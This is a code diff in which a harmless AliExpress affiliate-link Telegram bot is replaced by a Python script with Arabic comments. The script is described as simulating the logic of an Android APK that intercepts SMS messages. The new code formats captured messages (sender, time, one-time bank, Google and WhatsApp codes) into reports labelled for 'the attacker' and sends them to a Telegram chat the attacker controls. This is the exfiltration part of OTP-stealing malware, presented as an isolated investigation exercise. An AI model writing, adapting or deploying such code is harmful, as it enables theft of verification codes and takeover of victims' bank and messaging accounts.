@@ -1,114 +1,60 @@
-import os
+import telebot
 import time
-import hashlib
-import requests
-import re
-from urllib.parse import urlparse
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
 
-# ================== VARIABLES ==================
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-APP_KEY = os.getenv("APP_KEY")
-APP_SECRET = os.getenv("APP_SECRET")
-TRACKING_ID = os.getenv("TRACKING_ID")
+# --- إعدادات البوت التجريبي ---
+API_TOKEN = 'TOKEN_HERE'  # ضع التوكن الخاص بك هنا
+MY_CHAT_ID = 'USER_ID_HERE' # ضع معرف الشات الخاص بك هنا
 
-ALIEXPRESS_GATEWAY = "https://api-sg.aliexpress.com/sync"
+# تهيئة البوت
+bot = telebot.TeleBot(API_TOKEN)
 
-# ================== START MESSAGE ==================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 أهلاً بك\n\n"
-        "أرسل رابط أي منتج من AliExpress وسأعطيك زر شراء مباشر مع أفضل عرض متاح 🔥"
+def intercept_sms_logic(sender_number, sms_body):
+    """
+    هذه الدالة تحاكي المنطق البرمجي الذي يتم تنفيذه داخل الـ APK 
+    بمجرد التقاط رسالة SMS من نظام أندرويد.
+    """
+    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+    
+    # تنسيق الرسالة التي ستظهر للمهاجم في تليجرام
+    report_format = (
+        f"🔴 **تم اعتراض رسالة جديدة** 🔴\n\n"
+        f"📱 **من رقم:** `{sender_number}`\n"
+        f"🕒 **التوقيت:** `{timestamp}`\n"
+        f"💬 **المحتوى:**\n`{sms_body}`\n\n"
+        f"--------------------------"
     )
+    
+    return report_format
 
-# ================== EXTRACT PRODUCT ID ==================
-def extract_product_id(url):
-    patterns = [
-        r'/item/(\d+).html',
-        r'/i/(\d+).html',
-        r'product/(\d+)'
-    ]
-    for pattern in patterns:
-        match = re.search(pattern, url)
-        if match:
-            return match.group(1)
-    return None
-
-# ================== GENERATE SIGN ==================
-def generate_sign(params):
-    sorted_params = sorted(params.items())
-    string = APP_SECRET
-    for key, value in sorted_params:
-        string += f"{key}{value}"
-    string += APP_SECRET
-
-    return hashlib.md5(string.encode('utf-8')).hexdigest().upper()
-
-# ================== CREATE AFFILIATE LINK ==================
-def create_affiliate_link(product_url):
-    timestamp = str(int(time.time() * 1000))
-
-    params = {
-        "method": "aliexpress.affiliate.link.generate",
-        "app_key": APP_KEY,
-        "timestamp": timestamp,
-        "format": "json",
-        "v": "2.0",
-        "sign_method": "md5",
-        "tracking_id": TRACKING_ID,
-        "promotion_link_type": "0",
-        "source_values": product_url
-    }
-
-    sign = generate_sign(params)
-    params["sign"] = sign
-
-    response = requests.post(ALIEXPRESS_GATEWAY, data=params)
-    result = response.json()
-
+def send_to_analyst(formatted_message):
+    """إرسال البيانات إلى واجهة تليجرام"""
     try:
-        return result["aliexpress_affiliate_link_generate_response"]["resp_result"]["result"]["promotion_links"][0]["promotion_link"]
-    except:
-        print("AliExpress Error:", result)
-        return None
+        bot.send_message(MY_CHAT_ID, formatted_message, parse_mode='Markdown')
+        print("[+] SUCCESS: تم إرسال البيانات إلى البوت بنجاح.")
+    except Exception as e:
+        print(f"[-] ERROR: فشل الإرسال. السبب: {e}")
 
-# ================== HANDLE MESSAGE ==================
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    url = update.message.text.strip()
-
-    if "aliexpress" not in url:
-        await update.message.reply_text("❌ أرسل رابط منتج صحيح من AliExpress")
-        return
-
-    await update.message.reply_text("⏳ جاري إنشاء رابط الشراء...")
-
-    affiliate_link = create_affiliate_link(url)
-
-    if not affiliate_link:
-        await update.message.reply_text("❌ حدث خطأ أثناء إنشاء الرابط")
-        return
-
-    keyboard = [
-        [InlineKeyboardButton("🛒 شراء الآن", url=affiliate_link)]
+# --- محاكاة عملية الاختراق في بيئة معزولة ---
+if __name__ == "__main__":
+    print("--- تشغيل بيئة التحقيق السيبراني المعزولة ---")
+    
+    # 1. محاكاة وصول رسائل OTP مختلفة (سيناريوهات حقيقية)
+    test_cases = [
+        {"sender": "Google", "body": "G-482910 هو رمز التحقق الخاص بك."},
+        {"sender": "Bank_Auth", "body": "رمز الشراء للبطاقة المنتهية بـ 1234 هو: 5592. لا تشاركه."},
+        {"sender": "WhatsApp", "body": "كود واتساب الخاص بك هو [123-456]. لا تعطِ الكود لأحد."}
     ]
 
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    for sms in test_cases:
+        print(f"[*] جاري اعتراض رسالة من: {sms['sender']}...")
+        
+        # تنفيذ منطق الربط
+        final_report = intercept_sms_logic(sms['sender'], sms['body'])
+        
+        # إرسال التقرير للبوت
+        send_to_analyst(final_report)
+        
+        # تأخير بسيط لمحاكاة الواقع
+        time.sleep(2)
 
-    await update.message.reply_text(
-        "✅ اضغط الزر للشراء الآن:",
-        reply_markup=reply_markup
-    )
-
-# ================== MAIN ==================
-def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-
-    print("Bot is running...")
-    app.run_polling()
-
-if __name__ == "__main__":
-    main()
+    print("--- انتهت عملية المحاكاة ---")
